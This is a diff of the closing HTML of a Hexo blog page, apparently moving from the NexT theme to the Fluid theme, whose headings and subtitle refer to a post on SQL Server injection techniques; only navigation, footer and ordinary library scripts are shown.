+                </div>
+              
             </div>
-          
 
-          
             
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">4</span>
-                <span class="site-state-item-name">分类</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">7</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-
-        <div class="links-of-author motion-element">
-          
+          </div>
         </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友情链接
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://caligo.cc/" title="Caligo" target="_blank">Caligo</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://blog.xieldy.cn/" title="Xieldy" target="_blank">Xieldy</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://barriery.cn/" title="Barriery" target="_blank">Barriery</a>
-                </li>
-              
-            </ul>
-          </div>
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-Server"><span class="nav-number">1.</span> <span class="nav-text">SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过报错提取信息"><span class="nav-number">1.1.</span> <span class="nav-text">通过报错提取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过-having-子句枚举表和列"><span class="nav-number">1.1.1.</span> <span class="nav-text">通过 having 子句枚举表和列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用数据类型错误提取数据"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用数据类型错误提取数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取元数据"><span class="nav-number">1.2.</span> <span class="nav-text">获取元数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Order-by-子句"><span class="nav-number">1.3.</span> <span class="nav-text">Order by 子句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION-查询"><span class="nav-number">1.4.</span> <span class="nav-text">UNION 查询</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#union-查询探测列数"><span class="nav-number">1.4.1.</span> <span class="nav-text">union 查询探测列数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#union-查询敏感信息"><span class="nav-number">1.4.2.</span> <span class="nav-text">union 查询敏感信息</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用系统函数"><span class="nav-number">1.5.</span> <span class="nav-text">利用系统函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用存储过程"><span class="nav-number">1.6.</span> <span class="nav-text">利用存储过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态执行"><span class="nav-number">1.7.</span> <span class="nav-text">动态执行</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Architect</span>
-</div>
-
-
-<!--<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 强力驱动
-</div>
-
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
-    NexT.Pisces
-  </a>
-</div>
--->
-
-
-<p>Hosted by <a href="https://pages.coding.me" target="_blank" rel="noopener" style="font-weight: bold">Coding Pages</a></p>
-        
-<div class="busuanzi-count">
-  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="site-uv">
-      <i class="fa fa-user"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-      
-    </span>
-  
-
-  
-    <span class="site-pv">
-      <i class="fa fa-eye"></i>
-      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
-      
-    </span>
-  
-</div>
-
-
-        
-      </div>
-    </footer>
-
+    </div>
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
       </div>
     
-
   </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
 
   
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
   
 
-
   
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-  
-  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
   
 
   
 
   
 
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
   
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "常见数据库注入技巧——SQL Server&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
